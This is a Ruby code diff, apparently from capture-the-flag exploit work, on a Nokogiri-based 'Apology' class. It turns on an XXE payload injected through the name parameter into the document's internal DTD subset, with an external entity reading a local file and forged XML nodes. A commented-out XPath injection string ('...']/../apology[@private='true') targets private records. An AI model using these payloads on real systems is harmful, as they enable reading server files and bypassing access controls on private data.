@@ -28,7 +28,7 @@ class Apology
       self.write_to_file(sender_apologies_file)
     else
       builder = Nokogiri::XML::Builder.new do |xml|
-        xml.doc.create_internal_subset(@name_file,
+        xml.doc.create_internal_subset(@nickname_sender,
           "-//W3C//DTD HTML 4.01 Transitional//EN",
           "http://www.w3.org/TR/html4/loose.dtd")
         xml.root {
@@ -88,16 +88,17 @@ class Apology
   end
   
 end
-# name = """admin
-# <!DOCTYPE foo[<!ELEMENT foo ANY><!ENTITY xxe SYSTEM 'file:////home/texh0k0t/kek'>]>"""
+
+name = """admin
+[<!ELEMENT foo ANY><!ENTITY xxe SYSTEM 'file:////home/texh0k0t/kek'>]><root><apologies><apology id='qwertyu' private='false' nickname_receiver='admin_pitux'><apology_text>&xxe;</apology_text></apology></apologies></root><!--"""
 # puts name.split("\n")[0]
-ap = Apology.new("aaa-bbb-ccc")
+ap = Apology.new(name)
 # file = ap.parse_file()
 # new_id = file.xpath("//apologies/*").count + 1
-# ap.add_to_user_apology("Jack", "false", "HAX1")
+ap.add_to_user_apology("Jack", "false", "HAX1")
 # ap.add_to_user_apology("Jack", "true", "FLAG=")
 # ap.add_to_user_apology("LOX", "false", "NOPE")
 # puts ap.parse_file()
 # name_exploit = "KKKS_']/../apology[@private='true"
-# print ap.get_public_apology()
-puts ap.get_public_apology_id("l3h5OnFDQZ']/../apology[@private='true")
+print ap.get_public_apology()
+# puts ap.get_public_apology_id("l3h5OnFDQZ']/../apology[@private='true")
